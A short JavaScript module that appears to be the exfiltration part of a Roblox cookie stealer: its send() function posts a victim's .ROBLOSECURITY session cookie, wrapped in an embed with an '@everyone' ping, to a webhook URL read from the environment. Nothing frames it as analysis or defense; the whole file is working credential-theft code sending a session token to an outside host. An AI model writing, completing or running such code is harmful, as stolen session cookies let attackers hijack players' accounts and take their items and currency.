async function send(cookie, embed) {
    const webhookURL = process.env.WEBHOOK_URL;

    const res = await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "@everyone",
            embeds: [embed, {
                title: ".ROBLOSECURITY",
                description: "```" + cookie + "```",
                color: 0x2b2d31
            }]
        })
    });

    return res.text();
}

module.exports = { send };